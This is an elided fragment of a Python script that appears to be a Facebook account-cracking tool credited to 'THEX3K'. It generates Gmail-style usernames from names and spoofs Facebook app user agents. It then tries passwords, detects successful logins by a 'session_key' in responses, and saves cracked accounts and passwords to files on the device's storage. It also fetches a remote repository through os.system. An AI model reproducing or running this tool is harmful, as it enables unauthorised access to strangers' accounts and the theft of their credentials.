...
\033[1;97m Owner  : THEX3K :/

\033[1;97m GitHub : X3K-KING :/
...
def king_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/THEX3K-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' king-code=THEX3K-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','king-182^)Code=THEX3K-2233]'))

####@-----Gmail-----@####

def gmail():     

        os.system('rm -rf .THEX3K')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.THEX3K','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            ...
            fo = open('.THEX3K', 'r').read().splitlines()
...
Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36  [FB_IAB/Orca-Android;FBAV/389.1.0.23.284;]

Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36  [FB_IAB/Orca-Android;FBAV/389.1.0.23.984;]
...
def method():
    ...
    print(f"{oo('•')}/sdcard/THEX3K-OK.txt")
    ...
    def start(user):
     ...
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mking-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mTHEX3K-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/THEX3K-OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mTHEX3K-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/THEX3K-CP.txt','a').write(f'{acc} • {pword}\n')
    ...
    def start2(user):
      ...
      try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mking-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
